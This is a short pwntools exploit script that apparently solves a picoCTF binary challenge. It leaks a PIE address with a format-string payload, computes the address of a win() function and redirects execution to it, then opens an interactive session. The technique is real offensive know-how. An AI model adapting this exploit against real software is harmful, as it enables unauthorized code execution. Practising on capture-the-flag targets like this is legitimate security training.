from pwn import *

# Set binary and context
elf = context.binary = ELF('./vuln')
context.log_level = 'debug'

# === Set LOCAL to True to test locally ===
LOCAL = True  # Set to False for remote

# Connect locally or remotely
if LOCAL:
    p = process(elf.path)
else:
    p = remote('rescued-float.picoctf.net', 60937)

# === Step 1: Leak address of main() using format string ===
p.sendline(b"%23$p")  # Adjust if needed

# === Step 2: Receive leak ===
leaked = p.recvline()
log.info(f"Leaked PIE address line: {leaked}")

try:
    leaked_main = int(leaked.strip().split(b':')[-1], 16)
    log.success(f"Leaked main(): {hex(leaked_main)}")
except Exception as e:
    log.error(f"Could not parse leaked address: {e}")
    exit()

# === Step 3: Calculate PIE base and win() ===
log.info(f"elf.symbols['main'] = {hex(elf.symbols['main'])}")
elf.address = leaked_main - elf.symbols['main']  # This is all you need
log.success(f"PIE base: {hex(elf.address)}")

win_addr = elf.symbols['win']
log.success(f"win() = {hex(win_addr)}")

# === Step 4: Wait for input prompt and send win() address ===
p.recvuntil(b"ex =>")
p.sendline(hex(win_addr).encode())  # Send as hex string

# === Step 5: Interactive shell ===
p.interactive()
